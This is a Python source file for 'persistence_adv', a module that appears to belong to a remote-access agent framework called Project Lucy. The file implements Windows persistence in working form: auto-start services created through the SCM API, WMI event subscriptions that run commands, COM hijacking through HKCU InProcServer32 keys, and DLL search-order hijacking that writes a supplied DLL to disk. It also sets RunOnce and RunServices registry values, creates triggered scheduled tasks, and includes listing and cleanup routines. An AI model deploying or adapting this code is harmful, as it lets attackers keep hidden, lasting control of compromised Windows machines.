"""
Advanced persistence module for Project Lucy agent.
Installs multiple persistence mechanisms on Windows:
  - Windows services (via ctypes SCM API)
  - WMI event subscriptions
  - COM hijacking (registry-based)
  - DLL search order hijacking
  - RunOnce / RunServices registry keys
  - Scheduled tasks with specific triggers
  - Enumeration and cleanup of all Lucy persistence

Actions: install_service, remove_service, wmi_subscription,
         remove_wmi_subscription, com_hijack, remove_com_hijack,
         dll_hijack, remove_dll_hijack, registry_runonce,
         registry_runservices, scheduled_task_trigger,
         list_persistence, cleanup_all
"""
import base64
import os
import platform
import subprocess
import sys

name = "persistence_adv"
version = "1.0.0"
os_compat = ["Windows"]
dependencies: list[str] = []

SYSTEM = platform.system()

# Prefix used to tag Lucy persistence so list/cleanup can find it.
_LUCY_TAG = "Lucy"


def _result(data=None, error=None, status="completed") -> dict:
    return {"status": status, "data": data, "error": error}


def run(action: str = "list_persistence", **params) -> dict:
    if SYSTEM != "Windows":
        return _result(error="Windows-only module", status="failed")
    try:
        if action == "install_service":
            return _result(data=_install_service(params))
        elif action == "remove_service":
            return _result(data=_remove_service(params))
        elif action == "wmi_subscription":
            return _result(data=_wmi_subscription(params))
        elif action == "remove_wmi_subscription":
            return _result(data=_remove_wmi_subscription(params))
        elif action == "com_hijack":
            return _result(data=_com_hijack(params))
        elif action == "remove_com_hijack":
            return _result(data=_remove_com_hijack(params))
        elif action == "dll_hijack":
            return _result(data=_dll_hijack(params))
        elif action == "remove_dll_hijack":
            return _result(data=_remove_dll_hijack(params))
        elif action == "registry_runonce":
            return _result(data=_registry_runonce(params))
        elif action == "registry_runservices":
            return _result(data=_registry_runservices(params))
        elif action == "scheduled_task_trigger":
            return _result(data=_scheduled_task_trigger(params))
        elif action == "list_persistence":
            return _result(data=_list_persistence())
        elif action == "cleanup_all":
            return _result(data=_cleanup_all())
        return _result(error=f"Unknown action: {action}", status="failed")
    except Exception as exc:
        return _result(error=f"persistence_adv:{action} crashed: {exc}", status="failed")


# ---------------------------------------------------------------------------
# Windows Service helpers (ctypes SCM API)
# ---------------------------------------------------------------------------

# Service control manager access rights
SC_MANAGER_CONNECT = 0x0001
SC_MANAGER_CREATE_SERVICE = 0x0002
SC_MANAGER_ALL_ACCESS = 0xF003F

# Service access rights
SERVICE_ALL_ACCESS = 0xF01FF
DELETE = 0x00010000

# Service types
SERVICE_WIN32_OWN_PROCESS = 0x00000010

# Service start types
SERVICE_AUTO_START = 0x00000002
SERVICE_DEMAND_START = 0x00000003

# Service error control
SERVICE_ERROR_NORMAL = 0x00000001

# Service state
SERVICE_RUNNING = 0x00000004


def _install_service(params: dict) -> dict:
    import ctypes
    from ctypes import wintypes

    svc_name = params.get("name", "LucyUpdate")
    display_name = params.get("display_name", "Lucy Update Service")
    bin_path = params.get("bin_path", "") or sys.executable

    advapi32 = ctypes.windll.advapi32

    # OpenSCManager(machineName, databaseName, desiredAccess)
    advapi32.OpenSCManagerW.restype = wintypes.SC_HANDLE
    advapi32.OpenSCManagerW.argtypes = [wintypes.LPCWSTR, wintypes.LPCWSTR, wintypes.DWORD]
    h_scm = advapi32.OpenSCManagerW(None, None, SC_MANAGER_ALL_ACCESS)
    if not h_scm:
        return {"status": "error", "error": f"OpenSCManager failed (err={ctypes.get_last_error()})"}

    try:
        # CreateService(hSCManager, lpServiceName, lpDisplayName, dwDesiredAccess,
        #               dwServiceType, dwStartType, dwErrorControl, lpBinaryPathName, ...)
        advapi32.CreateServiceW.restype = wintypes.SC_HANDLE
        advapi32.CreateServiceW.argtypes = [
            wintypes.SC_HANDLE, wintypes.LPCWSTR, wintypes.LPCWSTR, wintypes.DWORD,
            wintypes.DWORD, wintypes.DWORD, wintypes.DWORD, wintypes.LPCWSTR,
            wintypes.LPCWSTR, ctypes.POINTER(wintypes.DWORD), wintypes.LPCWSTR,
            wintypes.LPCWSTR, wintypes.LPCWSTR, wintypes.LPCWSTR,
        ]
        h_svc = advapi32.CreateServiceW(
            h_scm, svc_name, display_name, SERVICE_ALL_ACCESS,
            SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL,
            bin_path, None, None, None, None, None,
        )

        if not h_svc:
            # Service may already exist — try to open it
            advapi32.OpenServiceW.restype = wintypes.SC_HANDLE
            advapi32.OpenServiceW.argtypes = [wintypes.SC_HANDLE, wintypes.LPCWSTR, wintypes.DWORD]
            h_svc = advapi32.OpenServiceW(h_scm, svc_name, SERVICE_ALL_ACCESS)
            if not h_svc:
                return {"status": "error", "error": f"CreateService failed (err={ctypes.get_last_error()})"}

        try:
            # StartService(hService, dwNumServiceArgs, lpServiceArgVectors)
            advapi32.StartServiceW.restype = wintypes.BOOL
            advapi32.StartServiceW.argtypes = [wintypes.SC_HANDLE, wintypes.DWORD, ctypes.POINTER(wintypes.LPCWSTR)]
            advapi32.StartServiceW(h_svc, 0, None)
            # Ignore start failure — service is installed regardless

            # Query status
            status = _query_service_status(advapi32, h_svc)
            return {
                "status": "ok",
                "name": svc_name,
                "display_name": display_name,
                "bin_path": bin_path,
                "start_type": "auto_start",
                "service_status": status,
            }
        finally:
            advapi32.CloseServiceHandle(h_svc)
    finally:
        advapi32.CloseServiceHandle(h_scm)


def _query_service_status(advapi32, h_svc) -> dict:
    from ctypes import wintypes, Structure, c_uint32, c_uint32 as DWORD

    class SERVICE_STATUS(Structure):
        _fields_ = [
            ("dwServiceType", DWORD),
            ("dwCurrentState", DWORD),
            ("dwControlsAccepted", DWORD),
            ("dwWin32ExitCode", DWORD),
            ("dwServiceSpecificExitCode", DWORD),
            ("dwCheckPoint", DWORD),
            ("dwWaitHint", DWORD),
        ]

    advapi32.QueryServiceStatus.restype = wintypes.BOOL
    advapi32.QueryServiceStatus.argtypes = [wintypes.SC_HANDLE, ctypes.POINTER(SERVICE_STATUS)]
    s = SERVICE_STATUS()
    if advapi32.QueryServiceStatus(h_svc, ctypes.byref(s)):
        state_map = {1: "stopped", 2: "start_pending", 3: "stop_pending",
                     4: "running", 5: "continue_pending", 6: "pause_pending", 7: "paused"}
        return {"current_state": state_map.get(s.dwCurrentState, f"unknown({s.dwCurrentState})")}
    return {"current_state": "unknown"}


def _remove_service(params: dict) -> dict:
    import ctypes
    from ctypes import wintypes

    svc_name = params.get("name", "")
    if not svc_name:
        return {"status": "error", "error": "Service name required"}

    advapi32 = ctypes.windll.advapi32

    advapi32.OpenSCManagerW.restype = wintypes.SC_HANDLE
    advapi32.OpenSCManagerW.argtypes = [wintypes.LPCWSTR, wintypes.LPCWSTR, wintypes.DWORD]
    h_scm = advapi32.OpenSCManagerW(None, None, SC_MANAGER_CONNECT)
    if not h_scm:
        return {"status": "error", "error": f"OpenSCManager failed (err={ctypes.get_last_error()})"}

    try:
        advapi32.OpenServiceW.restype = wintypes.SC_HANDLE
        advapi32.OpenServiceW.argtypes = [wintypes.SC_HANDLE, wintypes.LPCWSTR, wintypes.DWORD]
        h_svc = advapi32.OpenServiceW(h_scm, svc_name, SERVICE_ALL_ACCESS | DELETE)
        if not h_svc:
            return {"status": "error", "error": f"OpenService failed for '{svc_name}' (err={ctypes.get_last_error()})"}

        try:
            # Try to stop the service first
            advapi32.ControlService.restype = wintypes.BOOL
            advapi32.ControlService.argtypes = [wintypes.SC_HANDLE, wintypes.DWORD, ctypes.c_void_p]
            advapi32.ControlService(h_svc, 1, None)  # SERVICE_CONTROL_STOP = 1

            advapi32.DeleteService.restype = wintypes.BOOL
            advapi32.DeleteService.argtypes = [wintypes.SC_HANDLE]
            ok = advapi32.DeleteService(h_svc)
            if not ok:
                return {"status": "error", "error": f"DeleteService failed (err={ctypes.get_last_error()})"}
            return {"status": "ok", "name": svc_name, "deleted": True}
        finally:
            advapi32.CloseServiceHandle(h_svc)
    finally:
        advapi32.CloseServiceHandle(h_scm)


# ---------------------------------------------------------------------------
# WMI Event Subscription
# ---------------------------------------------------------------------------

def _wmi_subscription(params: dict) -> dict:
    name = params.get("name", "LucyWMI")
    command = params.get("command", "") or sys.executable
    interval = int(params.get("interval", 60))

    filter_name = f"{name}_Filter"
    consumer_name = f"{name}_Consumer"

    # EventFilter — triggers every N seconds via __InstanceCreationEvent interval timer
    filter_query = (
        f"SELECT * FROM __InstanceCreationEvent WITHIN {interval} "
        f"WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
    )

    ps_script = f"""
$filter = Set-WmiInstance -Class __EventFilter -Namespace root\\subscription -Arguments @{{
    Name = '{filter_name}';
    QueryLanguage = 'WQL';
    Query = "{filter_query}"
}} -ErrorAction Stop

$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\\subscription -Arguments @{{
    Name = '{consumer_name}';
    CommandLineTemplate = '{command}'
}} -ErrorAction Stop

Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\\subscription -Arguments @{{
    Filter = $filter;
    Consumer = $consumer
}} -ErrorAction Stop

Write-Output "WMI subscription '{name}' created successfully"
"""

    try:
        proc = subprocess.run(
            ["powershell", "-NoProfile", "-Command", ps_script],
            capture_output=True, text=True, timeout=30,
        )
        if proc.returncode != 0:
            return {"status": "error", "error": proc.stderr.strip() or proc.stdout.strip()}
        return {
            "status": "ok",
            "name": name,
            "filter_name": filter_name,
            "consumer_name": consumer_name,
            "command": command,
            "interval": interval,
            "output": proc.stdout.strip(),
        }
    except Exception as exc:
        return {"status": "error", "error": str(exc)}


def _remove_wmi_subscription(params: dict) -> dict:
    name = params.get("name", "LucyWMI")
    filter_name = f"{name}_Filter"
    consumer_name = f"{name}_Consumer"

    ps_script = f"""
Get-WmiObject -Class __EventFilter -Namespace root\\subscription -Filter "Name='{filter_name}'" |
    Remove-WmiObject -ErrorAction SilentlyContinue
Get-WmiObject -Class CommandLineEventConsumer -Namespace root\\subscription -Filter "Name='{consumer_name}'" |
    Remove-WmiObject -ErrorAction SilentlyContinue
Get-WmiObject -Class __FilterToConsumerBinding -Namespace root\\subscription |
    Where-Object {{ $_.Filter.Name -eq '{filter_name}' }} |
    Remove-WmiObject -ErrorAction SilentlyContinue
Write-Output "WMI subscription '{name}' removed"
"""

    try:
        proc = subprocess.run(
            ["powershell", "-NoProfile", "-Command", ps_script],
            capture_output=True, text=True, timeout=30,
        )
        return {
            "status": "ok",
            "name": name,
            "output": proc.stdout.strip(),
            "returncode": proc.returncode,
        }
    except Exception as exc:
        return {"status": "error", "error": str(exc)}


# ---------------------------------------------------------------------------
# COM Hijacking
# ---------------------------------------------------------------------------

def _com_hijack(params: dict) -> dict:
    import winreg

    clsid = params.get("clsid", "")
    target_path = params.get("target_path", "")
    description = params.get("description", "")

    if not clsid or not target_path:
        return {"status": "error", "error": "clsid and target_path required"}

    clsid_key = f"Software\\Classes\\CLSID\\{clsid}"

    try:
        # Create the CLSID key
        key = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, clsid_key, 0, winreg.KEY_SET_VALUE)
        if description:
            winreg.SetValueEx(key, None, 0, winreg.REG_SZ, description)
        winreg.CloseKey(key)

        # Create InProcServer32 subkey with the DLL path
        inproc_key = winreg.CreateKeyEx(
            winreg.HKEY_CURRENT_USER, f"{clsid_key}\\InProcServer32", 0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(inproc_key, None, 0, winreg.REG_SZ, target_path)
        winreg.SetValueEx(inproc_key, "ThreadingModel", 0, winreg.REG_SZ, "Both")
        winreg.CloseKey(inproc_key)

        return {
            "status": "ok",
            "clsid": clsid,
            "target_path": target_path,
            "hive": "HKCU",
            "key": f"Software\\Classes\\CLSID\\{clsid}\\InProcServer32",
        }
    except Exception as exc:
        return {"status": "error", "error": str(exc)}


def _remove_com_hijack(params: dict) -> dict:
    import winreg

    clsid = params.get("clsid", "")
    if not clsid:
        return {"status": "error", "error": "clsid required"}

    clsid_key = f"Software\\Classes\\CLSID\\{clsid}"

    try:
        _reg_delete_tree(winreg.HKEY_CURRENT_USER, clsid_key)
        return {"status": "ok", "clsid": clsid, "deleted": True}
    except FileNotFoundError:
        return {"status": "ok", "clsid": clsid, "deleted": False, "note": "key not found"}
    except Exception as exc:
        return {"status": "error", "error": str(exc)}


def _reg_delete_tree(root, path: str) -> None:
    """Recursively delete a registry key and all its subkeys."""
    import winreg
    try:
        key = winreg.OpenKey(root, path, 0, winreg.KEY_ALL_ACCESS)
        while True:
            try:
                subkey = winreg.EnumKey(key, 0)
                _reg_delete_tree(root, f"{path}\\{subkey}")
            except OSError:
                break
        winreg.CloseKey(key)
        winreg.DeleteKey(root, path)
    except FileNotFoundError:
        raise
    except Exception:
        pass


# ---------------------------------------------------------------------------
# DLL Search Order Hijacking
# ---------------------------------------------------------------------------

def _dll_hijack(params: dict) -> dict:
    target_dir = params.get("target_dir", "")
    dll_name = params.get("dll_name", "")
    dll_path_b64 = params.get("dll_path_b64", "")

    if not target_dir or not dll_name or not dll_path_b64:
        return {"status": "error", "error": "target_dir, dll_name, and dll_path_b64 required"}

    try:
        if not os.path.isdir(target_dir):
            os.makedirs(target_dir, exist_ok=True)

        dll_data = base64.b64decode(dll_path_b64)
        full_path = os.path.join(target_dir, dll_name)
        with open(full_path, "wb") as f:
            f.write(dll_data)

        return {
            "status": "ok",
            "target_dir": target_dir,
            "dll_name": dll_name,
            "full_path": full_path,
            "size": len(dll_data),
        }
    except Exception as exc:
        return {"status": "error", "error": str(exc)}


def _remove_dll_hijack(params: dict) -> dict:
    target_dir = params.get("target_dir", "")
    dll_name = params.get("dll_name", "")

    if not target_dir or not dll_name:
        return {"status": "error", "error": "target_dir and dll_name required"}

    full_path = os.path.join(target_dir, dll_name)
    try:
        os.remove(full_path)
        return {"status": "ok", "full_path": full_path, "deleted": True}
    except FileNotFoundError:
        return {"status": "ok", "full_path": full_path, "deleted": False, "note": "file not found"}
    except Exception as exc:
        return {"status": "error", "error": str(exc)}


# ---------------------------------------------------------------------------
# Registry RunOnce / RunServices
# ---------------------------------------------------------------------------

def _registry_runonce(params: dict) -> dict:
    import winreg

    name = params.get("name", "LucyUpdate")
    command = params.get("command", "") or sys.executable
    use_hkcu = params.get("hkcu", True)

    subpath = r"Software\Microsoft\Windows\CurrentVersion\RunOnce"
    hive = winreg.HKEY_CURRENT_USER if use_hkcu else winreg.HKEY_LOCAL_MACHINE
    hive_name = "HKCU" if use_hkcu else "HKLM"

    try:
        key = winreg.OpenKey(hive, subpath, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, name, 0, winreg.REG_SZ, command)
        winreg.CloseKey(key)
        return {
            "status": "ok",
            "hive": hive_name,
            "key": subpath,
            "name": name,
            "command": command,
        }
    except Exception as exc:
        return {"status": "error", "error": str(exc)}


def _registry_runservices(params: dict) -> dict:
    import winreg

    name = params.get("name", "LucyUpdate")
    command = params.get("command", "") or sys.executable

    subpath = r"Software\Microsoft\Windows\CurrentVersion\RunServices"

    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, subpath, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, name, 0, winreg.REG_SZ, command)
        winreg.CloseKey(key)
        return {
            "status": "ok",
            "hive": "HKLM",
            "key": subpath,
            "name": name,
            "command": command,
        }
    except Exception as exc:
        return {"status": "error", "error": str(exc)}


# ---------------------------------------------------------------------------
# Scheduled Task with Triggers
# ---------------------------------------------------------------------------

def _scheduled_task_trigger(params: dict) -> dict:
    name = params.get("name", "LucyTask")
    command = params.get("command", "") or sys.executable
    trigger = params.get("trigger", "on_logon")
    task_time = params.get("time", "")

    trigger_map = {
        "on_logon":  ("/sc", "ONLOGON", None),
        "on_startup": ("/sc", "ONSTART", None),
        "on_idle":    ("/sc", "ONIDLE", "/i", "10"),
        "daily":      ("/sc", "DAILY", "/st", task_time or "09:00"),
        "on_event":   ("/sc", "ONEVENT", "/ec", "System", "/mo", "*[System[Provider[@Name='Microsoft-Windows-Kernel-Power']]]"),
    }

    trigger_parts = trigger_map.get(trigger)
    if not trigger_parts:
        return {"status": "error", "error": f"Unknown trigger: {trigger}"}

    # Build schtasks command
    cmd = ["schtasks", "/create", "/f", "/tn", name, "/tr", command]
    cmd += list(trigger_parts)

    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        if proc.returncode != 0:
            return {
                "status": "error",
                "error": proc.stderr.strip() or proc.stdout.strip(),
                "returncode": proc.returncode,
            }
        return {
            "status": "ok",
            "name": name,
            "command": command,
            "trigger": trigger,
            "output": proc.stdout.strip(),
        }
    except Exception as exc:
        return {"status": "error", "error": str(exc)}


# ---------------------------------------------------------------------------
# Enumeration & Cleanup
# ---------------------------------------------------------------------------

def _list_persistence() -> dict:
    findings = {
        "services": [],
        "wmi_subscriptions": [],
        "com_hijacks": [],
        "registry_keys": [],
        "scheduled_tasks": [],
    }

    # Services
    try:
        out = subprocess.check_output(
            ["sc", "query", "type=", "service", "state=", "all"],
            text=True, timeout=15, errors="replace", stderr=subprocess.DEVNULL,
        )
        current = {}
        for line in out.splitlines():
            line = line.strip()
            if line.startswith("SERVICE_NAME:"):
                if current:
                    findings["services"].append(current)
                current = {"name": line.split(":", 1)[1].strip()}
            elif line.startswith("DISPLAY_NAME:") and current:
                current["display_name"] = line.split(":", 1)[1].strip()
            elif line.startswith("STATE") and current:
                current["state"] = line.split(":", 1)[1].strip()
        if current:
            findings["services"].append(current)
    except Exception as exc:
        findings["services"].append({"error": str(exc)})

    # WMI subscriptions
    try:
        ps = (
            "Get-WmiObject -Class __EventFilter -Namespace root\\subscription | "
            "Select-Object Name, Query | Format-List;"
            "Get-WmiObject -Class CommandLineEventConsumer -Namespace root\\subscription | "
            "Select-Object Name, CommandLineTemplate | Format-List;"
            "Get-WmiObject -Class __FilterToConsumerBinding -Namespace root\\subscription | "
            "Select-Object Filter, Consumer | Format-List"
        )
        proc = subprocess.run(
            ["powershell", "-NoProfile", "-Command", ps],
            capture_output=True, text=True, timeout=20,
        )
        if proc.stdout.strip():
            findings["wmi_subscriptions"] = [l.strip() for l in proc.stdout.splitlines() if l.strip()]
    except Exception as exc:
        findings["wmi_subscriptions"].append({"error": str(exc)})

    # COM hijacks (HKCU\Software\Classes\CLSID\*\InProcServer32)
    try:
        import winreg
        clsid_root = r"Software\Classes\CLSID"
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, clsid_root)
        i = 0
        while True:
            try:
                subkey_name = winreg.EnumKey(key, i)
                i += 1
                try:
                    inproc = winreg.OpenKey(key, f"{subkey_name}\\InProcServer32")
                    val = winreg.QueryValueEx(inproc, None)[0]
                    findings["com_hijacks"].append({"clsid": subkey_name, "dll_path": val})
                    winreg.CloseKey(inproc)
                except Exception:
                    pass
            except OSError:
                break
        winreg.CloseKey(key)
    except Exception as exc:
        findings["com_hijacks"].append({"error": str(exc)})

    # Registry Run/RunOnce/RunServices keys
    try:
        import winreg
        reg_paths = [
            (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", "HKCU\\Run"),
            (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\RunOnce", "HKCU\\RunOnce"),
            (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run", "HKLM\\Run"),
            (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\RunOnce", "HKLM\\RunOnce"),
            (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\RunServices", "HKLM\\RunServices"),
        ]
        for hive, path, label in reg_paths:
            try:
                key = winreg.OpenKey(hive, path)
                for j in range(winreg.QueryInfoKey(key)[1]):
                    name, value, _ = winreg.EnumValue(key, j)
                    findings["registry_keys"].append({
                        "location": label, "name": name, "command": value,
                    })
                winreg.CloseKey(key)
            except Exception:
                pass
    except Exception as exc:
        findings["registry_keys"].append({"error": str(exc)})

    # Scheduled tasks
    try:
        out = subprocess.check_output(
            ["schtasks", "/query", "/fo", "CSV", "/nh"],
            text=True, timeout=15, errors="replace", stderr=subprocess.DEVNULL,
        )
        for line in out.splitlines():
            parts = line.strip().strip('"').split('","')
            if len(parts) >= 2:
                findings["scheduled_tasks"].append({
                    "name": parts[0], "status": parts[1] if len(parts) > 1 else "",
                })
    except Exception as exc:
        findings["scheduled_tasks"].append({"error": str(exc)})

    return findings


def _cleanup_all() -> dict:
    results = {"removed": [], "errors": []}

    # Remove Lucy-tagged services
    try:
        out = subprocess.check_output(
            ["sc", "query", "type=", "service", "state=", "all"],
            text=True, timeout=15, errors="replace", stderr=subprocess.DEVNULL,
        )
        svc_names = []
        for line in out.splitlines():
            line = line.strip()
            if line.startswith("SERVICE_NAME:") and _LUCY_TAG.lower() in line.lower():
                svc_names.append(line.split(":", 1)[1].strip())
        for svc in svc_names:
            r = _remove_service({"name": svc})
            if r.get("status") == "ok":
                results["removed"].append(f"service:{svc}")
            else:
                results["errors"].append(f"service:{svc} - {r.get('error')}")
    except Exception as exc:
        results["errors"].append(f"service enum: {exc}")

    # Remove Lucy WMI subscriptions
    try:
        ps = (
            "Get-WmiObject -Class __EventFilter -Namespace root\\subscription | "
            f"Where-Object {{ $_.Name -like '{_LUCY_TAG}*' }} | Select-Object -ExpandProperty Name"
        )
        proc = subprocess.run(
            ["powershell", "-NoProfile", "-Command", ps],
            capture_output=True, text=True, timeout=20,
        )
        for line in proc.stdout.splitlines():
            line = line.strip()
            if line and _LUCY_TAG in line:
                sub_name = line.replace("_Filter", "").replace("_Consumer", "")
                r = _remove_wmi_subscription({"name": sub_name})
                if r.get("status") == "ok":
                    results["removed"].append(f"wmi:{sub_name}")
                else:
                    results["errors"].append(f"wmi:{sub_name} - {r.get('error')}")
    except Exception as exc:
        results["errors"].append(f"wmi enum: {exc}")

    # Remove Lucy registry Run/RunOnce entries
    try:
        import winreg
        reg_paths = [
            (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
            (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\RunOnce"),
            (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run"),
            (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\RunOnce"),
            (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\RunServices"),
        ]
        for hive, path in reg_paths:
            try:
                key = winreg.OpenKey(hive, path, 0, winreg.KEY_ALL_ACCESS)
                to_delete = []
                for j in range(winreg.QueryInfoKey(key)[1]):
                    name, value, _ = winreg.EnumValue(key, j)
                    if _LUCY_TAG.lower() in name.lower() or _LUCY_TAG.lower() in str(value).lower():
                        to_delete.append(name)
                for name in to_delete:
                    winreg.DeleteValue(key, name)
                    results["removed"].append(f"reg:{path}\\{name}")
                winreg.CloseKey(key)
            except Exception:
                pass
    except Exception as exc:
        results["errors"].append(f"reg enum: {exc}")

    # Remove Lucy scheduled tasks
    try:
        out = subprocess.check_output(
            ["schtasks", "/query", "/fo", "CSV", "/nh"],
            text=True, timeout=15, errors="replace", stderr=subprocess.DEVNULL,
        )
        task_names = []
        for line in out.splitlines():
            parts = line.strip().strip('"').split('","')
            if parts and _LUCY_TAG.lower() in parts[0].lower():
                task_names.append(parts[0])
        for task in task_names:
            subprocess.run(["schtasks", "/delete", "/f", "/tn", task],
                           capture_output=True, timeout=15)
            results["removed"].append(f"task:{task}")
    except Exception as exc:
        results["errors"].append(f"task enum: {exc}")

    return results
